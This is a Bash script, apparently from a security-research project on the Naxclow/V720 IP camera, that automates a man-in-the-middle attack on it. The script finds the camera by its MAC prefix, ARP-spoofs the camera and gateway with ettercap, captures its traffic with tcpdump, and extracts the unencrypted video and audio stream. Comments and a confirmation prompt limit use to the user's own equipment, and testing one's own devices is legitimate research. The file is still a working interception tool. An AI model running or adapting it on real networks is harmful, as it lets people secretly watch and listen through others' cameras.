#!/usr/bin/env bash
#
# capture_stream.sh — captura o stream STA da câmera Naxclow/V720 num comando só.
#
# 1. ARP spoof (MITM) na LAN.
# 2. tcpdump durante N minutos (ou até Ctrl-C).
# 3. Extrai vídeo/áudio UDP e salva em results/stream_<data_hora_fim>/.
#
# Uso:
#   sudo ./capture_stream.sh <IP_CAMERA> [MINUTOS]
#   sudo ./capture_stream.sh auto 5
#   sudo IFACE=en0 ./capture_stream.sh 192.168.0.17 3
#
# Overrides por env: CAM_IP=auto GW_IP=192.168.0.1 IFACE=en0
#
# Ambiente controlado / câmera própria. Não usar contra dispositivos de terceiros.
#
set -uo pipefail

CAM_IP="${1:-}"
MINUTES="${2:-2}"
GW_IP="${GW_IP:-192.168.0.1}"
IFACE="${IFACE:-en0}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
EXTRACTOR="$REPO_ROOT/scripts/utils/extract_mitm_video_udp.py"
OUT_ROOT="$REPO_ROOT/results"
WORK="$OUT_ROOT/.capturing_$$"
PCAP="$WORK/capture.pcap"

need_root() { [[ $EUID -eq 0 ]] || { echo "[!] precisa de root (sudo)." >&2; exit 1; }; }

my_ip() {
  if [[ "$(uname -s)" == "Darwin" ]]; then ipconfig getifaddr "$IFACE" 2>/dev/null
  else ip -4 -brief addr show "$IFACE" 2>/dev/null | awk '{print $3}' | cut -d/ -f1 | head -1; fi
}

discover_cam() {
  local net i
  net=$(my_ip | cut -d. -f1-3)
  [[ -n "$net" ]] || return 1
  for i in $(seq 1 254); do ping -c 1 -W 100 "$net.$i" >/dev/null 2>&1 & done
  wait
  arp -a -n 2>/dev/null | grep -i '5c:f1:50' | sed -E 's/.*\(([0-9.]+)\).*/\1/' | head -1
}

main() {
  need_root
  command -v ettercap >/dev/null || { echo "[!] falta ettercap" >&2; exit 1; }
  command -v tcpdump >/dev/null || { echo "[!] falta tcpdump" >&2; exit 1; }
  command -v python3 >/dev/null || { echo "[!] falta python3" >&2; exit 1; }

  if [[ "$CAM_IP" == "auto" || -z "$CAM_IP" ]]; then
    echo "[*] procurando a câmera pelo OUI 5c:f1:50 ..."
    CAM_IP=$(discover_cam)
    [[ -n "$CAM_IP" ]] || { echo "[!] câmera não achada no ARP." >&2; exit 1; }
    echo "[ok] câmera: $CAM_IP"
  fi

  local MY_IP
  MY_IP=$(my_ip)
  [[ -n "$MY_IP" ]] || { echo "[!] sem IPv4 em $IFACE" >&2; exit 1; }

  local DURATION=$(( MINUTES * 60 ))

  echo "=================================================================="
  echo " CAPTURA DE STREAM STA"
  echo "   câmera   : $CAM_IP"
  echo "   gateway  : $GW_IP"
  echo "   atacante : $MY_IP ($IFACE)"
  echo "   duração  : ${MINUTES} min (${DURATION}s)"
  echo "   saída    : $OUT_ROOT/stream_<data_hora_fim>/"
  echo "=================================================================="
  echo " Só prosseguir se ESTE equipamento e ESTA rede são teus / autorizados."
  read -r -p " Digitar 'SIM' para continuar: " CONFIRM
  [[ "$CONFIRM" == "SIM" ]] || { echo "abortado."; exit 1; }

  rm -rf "$WORK"
  mkdir -p "$WORK"

  if [[ -f /proc/sys/net/ipv4/ip_forward ]]; then FWD=net.ipv4.ip_forward
  else FWD=net.inet.ip.forwarding; fi
  ORIG_FWD=$(sysctl -n "$FWD")

  ETTERCAP_PID=""
  TCPDUMP_PID=""

  cleanup() {
    echo
    echo "[*] a encerrar captura ..."
    [[ -n "$TCPDUMP_PID" ]]  && kill "$TCPDUMP_PID" 2>/dev/null || true
    [[ -n "$ETTERCAP_PID" ]] && kill -INT "$ETTERCAP_PID" 2>/dev/null || true
    sleep 2
    sysctl -w "$FWD=$ORIG_FWD" >/dev/null 2>&1
  }
  trap cleanup EXIT INT TERM

  echo "[1/3] IP forwarding + ARP spoof ..."
  sysctl -w "$FWD=1" >/dev/null
  ettercap -T -q -i "$IFACE" -M arp:remote "/$CAM_IP//" "/$GW_IP//" \
    >"$WORK/ettercap.log" 2>&1 &
  ETTERCAP_PID=$!
  sleep 4
  kill -0 "$ETTERCAP_PID" 2>/dev/null || { echo "[!] ettercap morreu: ver $WORK/ettercap.log" >&2; exit 1; }

  echo "[2/3] capturando por ${MINUTES} min ... (Ctrl-C para parar e extrair já)"
  tcpdump -i "$IFACE" -n "host $CAM_IP" -w "$PCAP" >/dev/null 2>&1 &
  TCPDUMP_PID=$!

  local SECS=0
  while [[ $SECS -lt $DURATION ]]; do
    kill -0 "$ETTERCAP_PID" 2>/dev/null || { echo "[!] ettercap caiu."; break; }
    sleep 2; SECS=$((SECS+2))
    printf "\r    %ds / %ds" "$SECS" "$DURATION"
  done
  echo

  kill "$TCPDUMP_PID" 2>/dev/null || true; TCPDUMP_PID=""
  kill -INT "$ETTERCAP_PID" 2>/dev/null || true; ETTERCAP_PID=""
  sleep 2

  local STAMP OUT
  STAMP="$(date +%Y%m%d_%H%M%S)"
  OUT="$OUT_ROOT/stream_$STAMP"
  mkdir -p "$OUT"
  mv "$WORK"/* "$OUT"/ 2>/dev/null || true
  rmdir "$WORK" 2>/dev/null || true

  echo "[3/3] extraindo ..."
  python3 "$EXTRACTOR" "$OUT/capture.pcap" --out "$OUT" --cam-ip "$CAM_IP" || true

  python3 - "$OUT" <<'PY'
import sys, glob, os
try:
    import cv2, numpy as np
except ImportError:
    sys.exit(0)
out = sys.argv[1]
files = sorted(glob.glob(os.path.join(out, 'frames', '*.jpg')))
if not files:
    sys.exit(0)
imgs = [cv2.imread(f) for f in files]
imgs = [im for im in imgs if im is not None]
if not imgs:
    sys.exit(0)
cols = 4
rows = (len(imgs) + cols - 1) // cols
h, w = imgs[0].shape[:2]
canvas = np.zeros((rows*h, cols*w, 3), dtype=np.uint8)
for i, im in enumerate(imgs[:cols*rows]):
    r, c = divmod(i, cols)
    canvas[r*h:(r+1)*h, c*w:(c+1)*w] = im
cv2.imwrite(os.path.join(out, 'preview.png'), canvas)
PY

  echo
  echo "[✓] concluído em: $OUT"
  ls -1 "$OUT" 2>/dev/null | sed 's/^/    /'
  echo
  echo "    preview: open $OUT/preview.png"
  echo "    video:   open $OUT/video.avi"
}

main "$@"
